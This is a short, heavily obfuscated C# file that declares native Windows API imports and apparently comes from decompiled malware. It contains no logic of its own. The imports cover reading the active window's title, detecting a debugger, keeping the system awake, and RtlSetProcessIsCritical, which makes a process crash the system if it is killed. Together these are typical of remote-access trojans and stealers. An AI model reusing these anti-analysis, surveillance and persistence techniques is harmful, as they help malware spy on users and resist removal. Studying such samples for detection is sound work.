using System;
using System.Runtime.InteropServices;
using System.Text;

namespace TSsgkAiksqQbUk;

public static class uILLxCTKrMJm
{
	public enum qgzmrvJHvfFVwIuY : uint
	{
		PLZIODLLbmza = 2147483648u,
		YBXUcRbAfBbtJp = 2u,
		MVbchnUqeYB = 1u
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr sVFptaTTjmm, StringBuilder xzCgFCKebExlDO, int AaVaYYoXEWv);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string baujDUrxgPzNZc);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr DfvnfuPVSAiLZvN, ref bool LDcVnTlPAvRodlOny);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern qgzmrvJHvfFVwIuY SetThreadExecutionState(qgzmrvJHvfFVwIuY dpntRMFkqtVlCc);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint qXdzHLwUUP, uint RjnLtXUwJdR, uint DCHXPilXUXfAmyQ);
}
